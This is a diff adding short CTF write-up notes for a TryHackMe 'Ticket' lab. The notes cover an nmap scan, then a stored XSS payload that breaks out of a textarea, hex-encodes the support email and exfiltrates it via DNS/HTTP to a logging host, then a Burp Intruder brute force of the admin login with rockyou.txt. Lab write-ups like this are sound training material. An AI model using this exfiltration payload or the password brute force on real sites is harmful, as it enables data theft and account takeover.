@@ -1,0 +1,53 @@
+Ticket
+1) Find mail
+	* port scanning: nmap -sC -sV 10.10.63.200 -v
+		PORT   STATE SERVICE VERSION
+		22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+		| ssh-hostkey: 
+		|   2048 bfc39c992cc4e2d92033d13cdc0148d2 (RSA)
+		|   256 0820c273c7c5d7a7ef020911fc85a8e2 (ECDSA)
+		|_  256 1f51682b5e99574cb740150574d00d9b (ED25519)
+		80/tcp open  http    nginx 1.14.0 (Ubuntu)
+		|_http-server-header: nginx/1.14.0 (Ubuntu)
+		|_http-title: Ticket Manager > Home
+		| http-methods: 
+		|_  Supported Methods: GET HEAD POST
+		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	* tried gobuster, returns unknow values
+	* Found intersting: sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u - no use
+
+Hint: Our HTTP & DNS Logging tool on http://10.10.10.100 may come in useful! 
+	
+	* Register -> create ticket
+	* <div><textarea name="message" class="form-control" style="height: 200px;"></textarea></div>
+	* tried <script> tag not working , eg: <script> alert(1); </script>
+	* </textarea><script> alert(1); </textarea> - working
+	* we can write a simple script to trigger our IT support i.e http://10.10.10.100 -> our request: ae78xxxxxxxxxxxxxxxxxxx.log.tryhackme.tech
+
+	script:
+
+	</textarea><script>
+	const xhr = new XMLHttpRequest();
+	var email = document.getElementById("email").innerHTML;
+
+	var text = "";
+
+	for(i=0;i<email.length;i++){
+		text += email.charCodeAt(i).toString(16); //convert to hex
+	}
+
+	xhr.open('POST', 'http://'+text+'.ae78xxxxxxxxxxxxxxxxxxx.log.tryhackme.tech');
+	xhr.send();
+	</script><textarea>
+
+	* Got two request one is DNS and another one is HTTP
+	* so much dns, hex.ae78xxxxxxxxxxxxxxxxxxx.log... , if you try to convert the hex to ascii you can see 'hello@gmail.com' for some DNS but for one dns we got the support mail
+	* admin******@*******.thm
+
+2) Find password
+	* Open burpsuite
+	* intrude the login page by passing email: admin******@*******.thm
+	* with rockyou.txt
+	* password: 123***
+	* inside you can found the flag
